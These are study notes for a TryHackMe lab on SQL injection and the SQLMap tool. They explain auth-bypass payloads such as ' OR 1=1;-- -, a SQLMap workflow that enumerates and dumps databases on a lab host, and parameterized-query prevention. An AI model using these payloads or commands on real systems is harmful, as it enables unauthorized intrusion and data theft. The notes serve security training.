# 💉 SQL Injection & SQLMap — THM Study Notes

> **Room:** SQLMap: The Basics | **Platform:** TryHackMe
> 
> ⚠️ **Ethics Reminder:** Only test systems you have **explicit written permission** to attack. Unauthorized use is illegal.

---

## 📑 Table of Contents

1. [What Is a Database?](#-what-is-a-database)
2. [How Websites Interact with Databases](#-how-websites-interact-with-databases)
3. [What Is SQL Injection?](#-what-is-sql-injection)
4. [Breaking Down the Attack Payload](#-breaking-down-the-attack-payload)
5. [Types of SQL Injection](#-types-of-sql-injection)
6. [What Can an Attacker Do?](#-what-can-an-attacker-do)
7. [SQLMap — Automated Tool](#-sqlmap--automated-tool)
8. [SQLMap Attack Workflow](#-sqlmap-attack-workflow)
9. [GET vs POST Testing](#-get-vs-post-testing)
10. [Cookie-Based Authenticated Testing](#-cookie-based-authenticated-testing)
11. [Prevention](#-prevention)
12. [Quick Recall Cheatsheets](#-quick-recall-cheatsheets)

---

## 🗄️ What Is a Database?

A **database** is an organized collection of data that can be stored, modified, and retrieved efficiently.

- Managed by **Database Management Systems (DBMS)** — e.g. MySQL, PostgreSQL, SQLite, Microsoft SQL Server
- Websites use **SQL (Structured Query Language)** to communicate with the DBMS
- Every login, search, or form submission triggers an SQL query behind the scenes

```
User Input  →  Website  →  SQL Query  →  DBMS  →  Database
                                                      ↓
User Gets Response  ←  Website  ←  Query Result  ←──┘
```

---

## 🔑 How Websites Interact with Databases

When you log in, your credentials are wrapped into an SQL query:

**Input:**
```
Username: John
Password: Un@detectable444
```

**Query sent to DB:**
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

- The `AND` operator means **both** conditions must be true
- If a matching row is found → login succeeds ✅
- If no match → login fails ❌

---

## 💉 What Is SQL Injection?

**SQL Injection (SQLi)** is a vulnerability where an attacker **injects malicious SQL code** into an input field, tricking the database into executing unintended commands.

### Root Cause
> **Improper input sanitization** — user input is placed raw into SQL queries without being checked or cleaned first.

Think of it like this: the website hands the user a pen to fill in a form, but never checks if they've **rewritten the form itself**.

---

## 💥 Breaking Down the Attack Payload

The attacker doesn't know John's password, so they inject:

**Input:**
```
Username: John
Password: abc' OR 1=1;-- -
```

**Query becomes:**
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

### Why This Works — Step by Step

| Part | Role | Result |
|------|------|--------|
| `username = 'John'` | Checks if user John exists | ✅ True |
| `AND password = 'abc'` | Checks for password "abc" | ❌ False |
| `OR 1=1` | Always-true condition | ✅ Always True |
| `;-- -` | Comments out the rest | 🔇 Ignored |

Because of `OR`, **only one condition needs to be true** — and `1=1` is always true → attacker is logged in as John ✅

### 🧩 Role of Each Character

```
abc' OR 1=1;-- -
 │    │   │   │
 │    │   │   └── ;-- -  →  End query, comment out remainder (no syntax error)
 │    │   └──────  1=1   →  Always-true condition
 │    └──────────   OR   →  Only ONE condition needs to be true
 └───────────────   '    →  Closes the password string — CRITICAL!
```

> 🔑 **Without the `'`:** the entire string `abc OR 1=1;-- -` is treated as the password → harmless
> 
> **With the `'`:** it closes the password value and lets you inject new SQL logic

### 🧠 The 3-Part Formula

```
'        →  Break OUT of the string
OR 1=1   →  Make condition ALWAYS TRUE
;-- -    →  End query + silence the rest
```

---

## 🧩 Types of SQL Injection

| Type | How It Works | Sees Output? |
|------|-------------|--------------|
| **In-band (Classic)** | Result shown directly on page | ✅ Yes |
| **Error-based** | Triggers DB errors that leak data | ✅ Yes (in errors) |
| **UNION-based** | Uses `UNION` to merge data from other tables | ✅ Yes |
| **Boolean-based Blind** | True/false questions; infer from page behavior | ❌ No |
| **Time-based Blind** | Uses `SLEEP()` to delay response; infer from timing | ❌ No |
| **Out-of-band** | Exfiltrates data via DNS/HTTP channels | ❌ No |

> SQLMap supports **all six** techniques automatically.

---

## 🎯 What Can an Attacker Do?

- 🔓 **Bypass authentication** — log in without a password
- 📖 **Read sensitive data** — usernames, passwords, credit cards
- ✏️ **Modify or delete** database records
- 💾 **Dump entire databases**
- 💻 **Execute OS commands** on the server (in severe cases)

---

## 🤖 SQLMap — Automated Tool

**SQLMap** is an open-source, Python-based tool that **automates** detection and exploitation of SQLi vulnerabilities. Pre-installed on Kali Linux and Parrot OS.

### Essential Flags

| Flag | Purpose |
|------|---------|
| `-u <URL>` | Target URL to test |
| `--wizard` | Interactive beginner mode |
| `--help` | List all flags |
| `--dbs` | Extract all database names |
| `-D <db>` | Select a specific database |
| `--tables` | List tables in selected DB |
| `-T <table>` | Select a specific table |
| `--dump` | Dump all records from table |
| `--cookie="..."` | Pass session cookie (authenticated testing) |
| `-r <file.txt>` | Test from saved intercepted request |

---

## 🔁 SQLMap Attack Workflow

> **Memory Trick:** `S → D → T → Dump` *(Scan → Databases → Tables → Dump)*

### Step 1 — Scan for Vulnerabilities
```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1"
```
SQLMap tests the `cat` parameter and identifies which injection types work.

### Step 2 — Extract Database Names
```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" --dbs
```
```
available databases [2]:
[*] users
[*] members
```

### Step 3 — Extract Table Names
```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" -D users --tables
```
```
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |
+-----------+
```

### Step 4 — Dump Table Records
```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" -D users -T thomas --dump
```
```
+------------+------------+---------+
| Date       | name       | pass    |
+------------+------------+---------+
| 09/09/2024 | Thomas THM | testing |
+------------+------------+---------+
```

---

## 📨 GET vs POST Testing

| Method | When Used | SQLMap Approach |
|--------|-----------|-----------------|
| **GET** | Parameters in URL (`?cat=1`) | Use `-u` flag directly |
| **POST** | Data in request body (forms) | Intercept → save `.txt` → use `-r` flag |

```bash
# POST testing from intercepted request
sqlmap -r intercepted_request.txt
```

---

## 🍪 Cookie-Based Authenticated Testing

Many injection points are **only reachable after login**. Capture the session cookie from your browser and pass it with `--cookie`:

```bash
sqlmap -u "http://target.com/dashboard?id=5" --cookie="PHPSESSID=abcdef123456"
```

This makes SQLMap behave as an **authenticated user**, reaching protected pages.

**Common session cookie names:**
- `PHPSESSID` (PHP apps)
- `JSESSIONID` (Java apps)
- Custom auth tokens (JWT, etc.)

---

## 🛡️ Prevention

| Method | Why It Works |
|--------|-------------|
| **Parameterized Queries** | Input treated as data, never as SQL code |
| **Input Validation** | Reject/sanitize `'`, `--`, `;` characters |
| **Least Privilege** | DB accounts limited to only what they need |
| **WAF** | Detects and blocks common SQLi patterns |

```python
# ❌ Vulnerable — input mixed directly into query
query = "SELECT * FROM users WHERE username = '" + username + "'"

# ✅ Safe — parameterized (input never interpreted as SQL)
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))
```

---

## 🧠 Quick Recall Cheatsheets

### Core Concepts
| Concept | One-liner |
|---------|-----------|
| SQL Injection | Inject malicious SQL via input fields to manipulate the DB |
| DBMS | Software that manages the database (MySQL, PostgreSQL, etc.) |
| `' OR '1'='1` | Classic auth bypass payload |
| Boolean Blind | No output — infer data from true/false page behavior |
| Time-based Blind | No output — infer data from `SLEEP()` delays |
| SQLMap | Auto-tool to detect & exploit SQLi |
| `--dbs` | Lists all databases on the target server |
| Prevention | **Prepared statements** — the #1 fix |

### Attack Flow (1-liner each)
```
1. Find ?param=value in URL
2. sqlmap -u <URL>                              → Detect injection
3. sqlmap -u <URL> --dbs                        → List databases
4. sqlmap -u <URL> -D <db> --tables             → List tables
5. sqlmap -u <URL> -D <db> -T <table> --dump    → Extract data
```

### Injection Payload Anatomy
```
abc'  OR  1=1  ;--  -
 ↑    ↑    ↑    ↑
 |    |    |    └── Comment: silences rest of query
 |    |    └─────── Always true: bypasses password check
 |    └──────────── OR: only one condition needs to be true
 └───────────────── Quote: breaks out of the string context
```

---

*Notes based on TryHackMe — SQLMap: The Basics room*  
*Author: rajsegar | Last updated: May 2026*
